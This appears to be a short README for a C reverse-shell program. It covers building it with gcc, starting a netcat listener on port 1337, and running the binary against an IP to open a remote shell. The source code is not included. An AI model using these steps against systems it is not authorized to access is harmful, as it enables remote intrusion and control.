# Simple Reverse Shell
A run of the mill reverse shell written in C.

## Building
```
gcc -o reverse-shell reverse-shell.c
```

## Using
Bind a port on one machine to catch the shell:
```
nc -l -p 1337
```

And on the other machine simply run:
```
./reverse-shell <ip> 1337
```
